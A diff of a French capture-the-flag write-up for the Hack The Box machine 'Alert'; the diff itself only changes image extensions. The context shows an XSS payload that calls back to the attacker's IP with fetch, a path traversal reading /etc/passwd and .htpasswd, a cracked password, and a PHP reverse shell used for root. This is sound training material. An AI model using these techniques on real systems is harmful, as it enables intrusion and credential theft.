@@ -17,13 +17,13 @@ On utilise `gobuster` pour chercher si d'autres vhost existent. On trouve que le
 
 Voici la page d'accueil du site.
 
-{{ image(url="homepage.png", no_hover=true) }}
+{{ image(url="homepage.jpg", no_hover=true) }}
 
 Il s'agit d'un formulaire qui permet d'envoyer un fichier markdown, le serveur s'occupe ensuite de convertir le markdown en html et nous renvoie le resultat. Il nous fourni aussi un lien pour partager le resultat.
 
 En lançant une recherche de répértoire avec `dirsearch -u http://alert.htb` on trouve les pages suivantes.
 
-{{ image(url="dirsearch.png", no_hover=true) }}
+{{ image(url="dirsearch.jpg", no_hover=true) }}
 
 On y voit plusieurs pages dont nous n'avions pas connaissance : `/messages`, `/messages.php` et `/uploads`. Les pages `/messages` et `/uploads` renvoie vers des 403. La page `/message.php` vers une page vide. On laisse ça de coté pour le moment.
 
@@ -39,7 +39,7 @@ alert('XSS :)')
 
 Le serveur nous renvoie cette page :
 
-{{ image(url="xss_poc.png", no_hover=true) }}
+{{ image(url="xss_poc.jpg", no_hover=true) }}
 
 Nous savons donc qu'il est possible d'injecter du javascript dans le markdown et qu'il sera présent aussi après conversion. Cependant, pour que ça serve à quelque chose il faut que ce code javascript soit executé sur la machine de quelqu'un d'autre que la notre (un admin du site par exemple...)
 
@@ -49,7 +49,7 @@ Dans la page `about` du site on peut lire `"If you experience any problems with 
 
 Nous pouvons donc tenter de faire ouvrir cette page infecter à l'administrateur en utilisant la page de contact.
 
-{{ image(url="contact_page.png", no_hover=true) }}
+{{ image(url="contact_page.jpg", no_hover=true) }}
 
 Pour cela nous pouvons envoyer le lien de partage de notre document à l'admin via la page de contact, en esperant qu'il l'ouvre. Il nous faut donc un moyen de prouver qu'il a bien ouvert notre lien.
 
@@ -67,9 +67,9 @@ fetch('http://<MYIP>:5000');
 
 Il nous faut donc envoyer ce payload via la page d'upload (`http://alert.htb?page=alert`). Récupérer le lien de partage, envoyer ce lien via le formulaire de contact puis attendre de voir si notre lien est requeté.
 
-{{ image(url="mail_contact.png", no_hover=true) }}
+{{ image(url="mail_contact.jpg", no_hover=true) }}
 
-{{ image(url="pingback.png", no_hover=true) }}
+{{ image(url="pingback.jpg", no_hover=true) }}
 
 On peut voir que notre serveur a bien été requeté. On sait donc que notre lien a été ouvert.
 
@@ -120,7 +120,7 @@ fetch("http://alert.htb/messages.php?file=../../../../../etc/passwd")  <---- REQ
 
 On obtient le resultat suivant :
 
-{{ image(url="passwd.png", no_hover=true) }}
+{{ image(url="passwd.jpg", no_hover=true) }}
 
 Il s'agit du fichier `/etc/passwd` encodé comme paramètre de notre URL. Nous pouvons donc lire des fichiers du système via cette vulnérabilité.
 
@@ -132,7 +132,7 @@ En utilisant ces deux scripts, nous pouvons commencer à explorer et à chercher
 
 Au début de ce rapport en énumérant nous avons trouver l'url `statistics.alert.htb` qui était inaccessible car protégé par le serveur web. Nous allons chercher le fichier `.htpasswd` qui nous permettrait de connaitre les identifiants pour y acceder. On le trouve en utilisant le chemin `../../../../var/www/statistics.alert.htb/.htpasswd`.
 
-{{ image(url="htpasswd.png", no_hover=true) }}
+{{ image(url="htpasswd.jpg", no_hover=true) }}
 
 ## Accès au serveur
 ### Flag user
@@ -143,7 +143,7 @@ Le mot de passe trouvé est `manchesterunited`. Comme souvent dans les machines 
 
 On a donc accès à la machine en SSH et on récupère le flag user.
 
-{{ image(url="user_logged.png", no_hover=true) }}
+{{ image(url="user_logged.jpg", no_hover=true) }}
 
 ### Flag root
 
@@ -179,4 +179,4 @@ On voit que le dossier `/opt/website-monitor` est utilisé comme repertoire sour
 
 Il nous suffit donc de placer un fichier `.php` nous permettant d'obtenir un reverse shell (par exemple celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)) dans le dossier `/opt/website-monitor/config`, et nous aurons accès en tant que root à la machine.
 
-{{ image(url="root_flag.png", no_hover=true) }}
+{{ image(url="root_flag.jpg", no_hover=true) }}
